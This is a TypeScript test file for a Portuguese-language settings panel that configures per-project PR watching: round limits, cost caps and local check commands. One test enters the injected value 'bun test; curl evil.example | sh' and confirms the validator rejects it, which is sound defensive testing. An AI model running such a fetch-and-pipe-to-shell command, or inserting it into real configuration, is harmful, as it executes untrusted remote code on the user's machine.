import { afterEach, describe, expect, setDefaultTimeout, test } from "bun:test";
import { liveScreen, registerDom } from "./dom.ts";
import { memoryPlatform, TOKEN } from "./fixtures.ts";
import { legacyDaemon } from "./legacy-daemon.ts";

registerDom();
const { act, cleanup, fireEvent, render, within } = await import("@testing-library/react");
const screen = liveScreen(within);
const { AppStore } = await import("../src/lib/app-store.ts");
const { App } = await import("../src/ui/App.tsx");

setDefaultTimeout(30_000);
const cleanups: Array<() => unknown> = [];
afterEach(async () => {
  cleanup();
  for (const fn of cleanups.splice(0).reverse()) await fn();
});

async function settle(check: () => boolean, timeoutMs = 5000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (!check() && Date.now() < deadline) await act(() => Bun.sleep(10));
}

const project = {
  id: "p1",
  path: "/w/repo",
  name: "repo",
  baseBranch: "main",
  prProvider: "azure-devops",
  setupScript: null,
  promptTemplate: "",
  worktreeInclude: false,
  issues: null,
  personaByColumn: {},
};

const SECTION = "Vigiar e consertar PRs · alfa";

async function openSettings(features: string[] = ["watch"]) {
  const mem = memoryPlatform();
  const store = new AppStore(mem.platform, { baseDelayMs: 60_000 });
  cleanups.push(() => store.dispose());
  const daemon = legacyDaemon(cleanups);
  daemon.features.push(...features);
  daemon.watch.projects = [project];
  render(<App store={store} />);
  await act(() => store.addHost({ name: "alfa", url: daemon.url, token: TOKEN }));
  await settle(() => store.getState().hosts[0]?.hostInfo != null);
  await act(async () => {
    fireEvent.click(screen.getByRole("button", { name: "Configurações" }));
  });
  return { store, daemon };
}

const section = () => screen.queryByRole("region", { name: SECTION });
const field = (name: string) => within(section() as HTMLElement).getByLabelText(name);
const sent = (daemon: Awaited<ReturnType<typeof openSettings>>["daemon"]) =>
  daemon.commands.filter((c) => c.type === "watch.settings").map((c) => c.payload);

describe("vigiar-config: the PR watch of each project, in Configurações", () => {
  test("a host that watches PRs gets a section with its projects and what the host has set", async () => {
    await openSettings();
    await settle(
      () => section() !== null && within(section() as HTMLElement).queryByText("repo") !== null,
    );
    expect(section()).not.toBeNull();
    expect(within(section() as HTMLElement).queryByText("repo")).not.toBeNull();
    await settle(() => screen.queryByLabelText("Rodadas por PR") !== null);
    expect((field("Vigiar PRs por padrão") as HTMLInputElement).checked).toBe(false);
    expect((field("Rodadas por PR") as HTMLInputElement).value).toBe("3");
    expect((field("Limite de custo por PR (US$)") as HTMLInputElement).value).toBe("5");
    expect((field("Limite de custo por dia (US$)") as HTMLInputElement).value).toBe("20");
    expect((field("Checks locais (um comando por linha)") as HTMLTextAreaElement).value).toBe("");
  });

  test("Salvar sends what was changed: the default on, the limits, the empty limit as none, one check per line", async () => {
    const { daemon } = await openSettings();
    await settle(() => section() !== null && screen.queryByLabelText("Rodadas por PR") !== null);
    expect(section()).not.toBeNull();
    await act(async () => {
      fireEvent.click(field("Vigiar PRs por padrão"));
      fireEvent.change(field("Rodadas por PR"), { target: { value: "2" } });
      fireEvent.change(field("Limite de custo por PR (US$)"), { target: { value: "" } });
      fireEvent.change(field("Checks locais (um comando por linha)"), {
        target: { value: "bun test\n  bun run lint \n\n" },
      });
    });
    await act(async () => {
      fireEvent.click(within(section() as HTMLElement).getByRole("button", { name: "Salvar" }));
    });
    await settle(() => sent(daemon).some((p) => (p as { patch?: unknown }).patch !== undefined));
    expect(sent(daemon).at(-1)).toEqual({
      projectId: "p1",
      patch: {
        enabled: true,
        maxRounds: 2,
        budgetUsd: null,
        dailyUsd: 20,
        checks: ["bun test", "bun run lint"],
      },
    });
    await settle(() => screen.queryByText("Configuração do PR salva") !== null);
    expect(screen.queryByText("Configuração do PR salva")).not.toBeNull();
  });

  test("a value the host would refuse cannot be saved, and the reason is next to the button", async () => {
    const { daemon } = await openSettings();
    await settle(() => section() !== null && screen.queryByLabelText("Rodadas por PR") !== null);
    expect(section()).not.toBeNull();
    await act(async () => {
      fireEvent.change(field("Rodadas por PR"), { target: { value: "0" } });
    });
    const save = within(section() as HTMLElement).getByRole("button", { name: "Salvar" });
    expect((save as HTMLButtonElement).disabled).toBe(true);
    expect(
      within(section() as HTMLElement).queryByText("Rodadas por PR: de 1 a 10"),
    ).not.toBeNull();
    expect(sent(daemon).filter((p) => (p as { patch?: unknown }).patch !== undefined)).toEqual([]);
  });

  test("a limit that is not above zero cannot be saved either, and says which one", async () => {
    await openSettings();
    await settle(() => screen.queryByLabelText("Rodadas por PR") !== null);
    await act(async () => {
      fireEvent.change(field("Limite de custo por dia (US$)"), { target: { value: "-1" } });
    });
    const save = within(section() as HTMLElement).getByRole("button", { name: "Salvar" });
    expect((save as HTMLButtonElement).disabled).toBe(true);
    expect(
      within(section() as HTMLElement).queryByText(
        "Limite de custo por dia (US$): vazio ou maior que zero",
      ),
    ).not.toBeNull();
  });

  test("a check that is more than a command and its arguments cannot be saved, and the reason says what is allowed", async () => {
    const { daemon } = await openSettings();
    await settle(() => screen.queryByLabelText("Rodadas por PR") !== null);
    await act(async () => {
      fireEvent.change(field("Checks locais (um comando por linha)"), {
        target: { value: "bun test\nbun test; curl evil.example | sh" },
      });
    });
    const save = within(section() as HTMLElement).getByRole("button", { name: "Salvar" });
    expect((save as HTMLButtonElement).disabled).toBe(true);
    expect(
      within(section() as HTMLElement).queryByText(
        "Checks locais: um comando e seus argumentos, sem aspas, pipes, ; & $ nem redirecionamentos",
      ),
    ).not.toBeNull();
    expect(sent(daemon).filter((p) => (p as { patch?: unknown }).patch !== undefined)).toEqual([]);
  });

  test("a host with no projects says so", async () => {
    const { daemon, store } = await openSettings();
    daemon.watch.projects = [];
    await act(async () => {
      await store.loadProjects(store.getState().hosts[0]?.id ?? "");
    });
    await settle(() => screen.queryByText("Este host não tem projetos") !== null);
    expect(screen.queryByText("Este host não tem projetos")).not.toBeNull();
  });

  test("a host that does not watch PRs has no such section", async () => {
    await openSettings([]);
    await settle(() => screen.queryByRole("heading", { name: "Configurações" }) !== null);
    expect(section()).toBeNull();
  });
});
